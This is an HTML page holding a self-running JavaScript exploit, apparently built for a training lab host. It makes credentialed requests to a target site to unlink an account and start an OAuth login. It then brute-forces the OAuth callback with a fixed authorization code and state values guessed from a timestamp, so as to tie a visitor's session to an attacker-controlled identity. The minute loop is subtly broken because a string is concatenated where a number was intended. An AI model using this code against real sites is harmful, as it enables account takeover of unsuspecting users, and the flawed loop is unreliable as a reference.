<!DOCTYPE html>
<html>

  <body>
<script>


(async ()=>{
    var client_url = "http://ptl-70a53532-e23265ca.libcurl.so"
    var code = "697461b8796205519f24b2cab219da8ae84e54d00397ddb435073446a20840a7"
    var state = "2021080823"
    var utc_m= "55"
    
    function zeroPad(num, size) {
        num = num.toString();
        while (num.length < size) num = "0" + num;
        return num;
    }


    try {
        await fetch(client_url+"/unlink", {
            credentials: 'include'
        })
    }
    catch(e) {
        console.log("BB"+e);
    }

    try {
        await fetch(client_url+"/users/auth/myprovider", {
            credentials: 'include'
        })
    }
    catch(e) {
        console.log("BB"+e);
    }
    for (let m=utc_m; m<utc_m+2; m++)
    {
        for (let s=0;s<60;s++) {
            try {
                await fetch(client_url+"/users/auth/myprovider/callback?code="+code+"&state="+state+zeroPad(m,2)+zeroPad(s,2), {
                    credentials: 'include'
                })
            }
            catch(e) {
                console.log("BB"+e);
            }
        }
    }
})();
</script>
